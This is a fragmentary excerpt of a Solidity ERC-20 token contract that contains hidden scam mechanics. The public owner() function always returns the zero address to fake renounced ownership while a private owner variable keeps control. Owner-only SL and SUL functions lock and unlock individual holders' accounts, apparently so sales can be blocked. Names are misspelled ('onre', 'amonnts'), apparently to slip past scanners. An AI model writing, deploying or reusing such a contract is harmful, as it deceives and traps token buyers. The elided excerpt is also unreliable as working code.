...
interface IERC20 {
    ...
    function allowance(address onre, address spender) external view returns (uint256);
    ...
    event Approval( address indexed onre, address indexed spender, uint256 value );
}
...
contract Ownable is Context {
    address private _onre;
    event onreshipTransferred(address indexed previousonre, address indexed newonre);

    constructor () {
        address msgSender = _msgSender();
        _onre = msgSender;
        emit onreshipTransferred(address(0), msgSender);
    }
    function onre() public virtual view returns (address) {
        return address(0);
    }
    modifier onlyonre() {
        require(_onre == _msgSender(), "Ownable: caller is not the onre");
        _;
    }
    function renounceonreship() public virtual onlyonre {
        emit onreshipTransferred(_onre, address(0x000000000000000000000000000000000000dEaD));
        _onre = address(0x000000000000000000000000000000000000dEaD);
    }
}
...
contract token is Ownable, IERC20 {
    ...
    function SL(address avcount) public onlyonre {
        _LKD[avcount] = true;
    }


    function SUL(address avcount) public onlyonre {
        _LKD[avcount] = false;
    }
    ...
    function _approve(address onre, address spender, uint256 amonnts) internal virtual {
        require(onre != address(0), "IERC20: approve from the zero address");
        require(spender != address(0), "IERC20: approve to the zero address");
        _allowances[onre][spender] = amonnts;
        emit Approval(onre, spender, amonnts);
    }

    function allowance(address onre, address spender) public view virtual override returns (uint256) {
        return _allowances[onre][spender];
    }
